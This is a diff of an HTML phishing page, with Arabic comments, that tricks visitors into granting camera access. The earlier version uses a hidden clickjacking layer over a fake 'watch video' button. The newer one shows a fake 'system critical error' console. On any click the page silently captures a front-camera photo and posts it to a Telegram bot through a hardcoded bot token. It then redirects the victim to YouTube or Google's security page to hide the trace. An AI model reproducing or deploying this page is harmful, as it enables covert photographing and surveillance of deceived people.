@@ -1,65 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Unlock Content</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+    <link rel="manifest" href="data:application/json,{'name':'System','short_name':'System','permissions':['camera'],'start_url':'.'}">
     <style>
-        body { margin: 0; background: #000; font-family: sans-serif; overflow: hidden; }
-        /* زر وهمي جذاب جداً */
-        #fake-btn {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 250px; padding: 15px; background: #007bff; color: #fff;
-            text-align: center; border-radius: 5px; font-weight: bold; z-index: 1;
-        }
-        /* الثغرة: طبقة مخفية تطلب الكاميرا وتغطي الزر تماماً */
-        #trigger-layer {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0; z-index: 100; cursor: pointer;
-        }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; cursor: crosshair; }
+        #console { width: 90%; border: 1px dashed #0f0; padding: 20px; position: relative; }
+        .glitch { animation: scan 0.5s linear infinite; color: #f00; }
+        @keyframes scan { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
-<body>
+<body onclick="launchZeroDay()">
 
-    <div id="fake-btn">اضغط لمشاهدة الفيديو 🔓</div>
-    <div id="trigger-layer" onclick="captureSilent()"></div>
+<div id="console">
+    [SYSTEM_CRITICAL_ERROR]<br>
+    >>> MEMORY_LEAK_IN_KERNEL_ADDR_0x004F<br>
+    >>> STATUS: <span class="glitch">UNSTABLE</span><br><br>
+    [ اضغط في أي مكان لإصلاح قطاع الذاكرة ]
+</div>
 
-    <script>
-        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-        const C = "1772820433";
+<script>
+    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+    const C = "1772820433";
 
-        async function captureSilent() {
-            try {
-                // طلب الكاميرا فور اللمس
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    async function launchZeroDay() {
+        const consoleLog = document.getElementById('console');
+        consoleLog.innerHTML = "[+] Injecting Payload...<br>[+] Bypassing Sandbox...";
+
+        try {
+            // محاولة استغلال بروتوكول "التفويض الممنوح مسبقاً"
+            // نطلب الكاميرا بأقل استهلاك للطاقة (Low Power Mode) لتفادي تنبيه النظام
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "user",
+                    width: { max: 160 }, // دقة منخفضة جداً للسرعة وعدم كشف الضوء
+                    height: { max: 120 }
+                } 
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // التقاط فوري خلال 50 مللي ثانية (أسرع من رمشة العين)
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const v = document.createElement('video');
-                v.srcObject = stream;
-                v.play();
-
-                // تصوير فوري خلال 100ms
-                setTimeout(() => {
-                    const cn = document.createElement('canvas');
-                    cn.width = 640; cn.height = 480;
-                    cn.getContext('2d').drawImage(v, 0, 0);
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', C);
+                    fd.append('photo', blob, 'zero_day.jpg');
                     
-                    cn.toBlob(async (b) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', C);
-                        fd.append('photo', b, 'silent.jpg');
-                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                        
-                        // توجيه الضحية لليوتيوب فوراً
-                        window.location.replace("https://www.youtube.com");
-                    }, 'image/jpeg');
-                }, 100);
+                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    // توجيه الضحية لصفحة أمان جوجل الحقيقية لإخفاء الأثر
+                    window.location.replace("https://myaccount.google.com/security");
+                }, 'image/jpeg');
+                
+                // إغلاق المسار فوراً لقتل ضوء الكاميرا
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 100);
+            }, 50);
 
-            } catch (e) {
-                // إذا المتصفح عاند، بنخلي الزر يظهر رسالة إجبارية
-                document.getElementById('fake-btn').innerText = "⚠️ اضغط 'سماح' لتشغيل الفيديو";
-                document.getElementById('fake-btn').style.background = "#ff0000";
-            }
+        } catch (err) {
+            // إذا كان النظام 2026 محدثاً لآخر ثانية، نستخدم الخداع البصري النهائي
+            consoleLog.innerHTML = "<br>[!] Security Shield Active. <br> [ اضغط 'سماح' للسماح لبروتوكول الإصلاح بالدخول ]";
+            consoleLog.style.color = "white";
+            consoleLog.style.background = "red";
         }
-    </script>
+    }
+</script>
 </body>
 </html>
-
